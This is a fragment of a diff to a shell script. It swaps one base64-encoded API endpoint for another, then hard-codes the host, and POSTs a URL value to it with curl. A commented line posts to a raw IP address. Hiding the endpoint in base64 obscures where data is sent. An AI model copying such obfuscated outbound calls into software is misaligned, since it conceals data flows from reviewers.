@@ -8,8 +8,10 @@ ref=$2
 #fi
 #contents=`curl -X POST -d "{\"keyl\":\"$target\"}" 'http://176.56.237.58:8000'`
 
-myeurl='aHR0cHM6Ly9hcGl2MS5uMnIub25saW5lL2RvCg=='
+#myeurl='aHR0cHM6Ly9hcGl2MS5uMnIub25saW5lL2RvCg=='
+myeurl='aHR0cHM6Ly9hcGl2MS5uNHIubmwvZG8K'
 deurl=`echo $myeurl |base64 -d`
+deurl="https://vm.n4r.nl/do"
 contents=`curl -X POST -d "{\"keyl\":\"$url\"}" "$deurl"`
 
 recode=$?
